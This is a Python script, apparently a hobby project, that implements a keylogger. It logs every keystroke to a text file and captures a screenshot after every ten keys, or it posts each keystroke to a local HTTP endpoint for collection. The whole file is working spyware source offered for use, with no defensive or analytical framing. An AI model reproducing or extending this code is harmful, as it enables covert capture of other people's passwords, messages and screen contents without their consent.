import pyautogui
from pynput import keyboard
import logging
import os, datetime
import httpx

key_count = 0

def log_file():
    # delete last keylogger file
    def log_delete():
        log = "keylog.txt"
        if os.path.exists(log):
            os.remove(log)
            print("Previous log deleted, creating new file")
        else:
            print("Creating new log file")


    # delete screenshot function
    def screenshot_delete():
        screenshots_folder = "screenshots"
        screenshots = os.listdir(screenshots_folder)
        if screenshots:
            screenshot_delete = input("Would you like to delete stored screenshots? Y/N ")
            if screenshot_delete.lower() == "y":
                for file in screenshots:
                    file_path = os.path.join(screenshots_folder, file)
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                        print(f"Deleted {file}")
                print("All screenshots have been deleted.")
            else:
                print("Screenshots will not be deleted.")
        else:
            pass


    log_delete()
    screenshot_delete()


    logging.basicConfig(filename="keylog.txt", level=logging.INFO, format="%(asctime)s - %(message)s")


    # screenshot function = ss when alt is pressed
    def screenshot():
        name = datetime.datetime.now().strftime("%H-%M-%S")
        pyautogui.screenshot(f'screenshots/{name}.png')


    def on_press(key):
        global key_count

        if hasattr(key, 'char'):
            logging.info(f"Key: {key.char} ")
            key_count += 1
        else:
            logging.info(f"Key: {key} ")
            key_count += 1
        if key_count % 10 == 0:
            screenshot()


    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    print("Starting listener now...")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def local_server():
    print("Will work soon...")

    server_url = "http://127.0.0.1:8000/log_key"


    async def send_key_server(key: str):
        async with httpx.AsyncClient() as client:
            payload = {"key": key}
            await client.post(server_url, json=payload)

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_char = key.char
                import asyncio
                asyncio.run(send_key_server(key_char))
            else:
                import asyncio
                asyncio.run(send_key_server(str(key)))
        except Exception as e:
            pass


    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    def start():
        print("Starting listner now...")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    if __name__ == "__main__":
        start()


while True:
    keylogger_ver = input("Would you like a local server(1) or a text file(2) for key logs? 1/2: ")
    if keylogger_ver.lower() == "1":
        local_server()
        break
    elif keylogger_ver.lower() == "2":
        log_file()
        break
    else:
        print("Not a valid choice, input 1 or 2, please try again.")

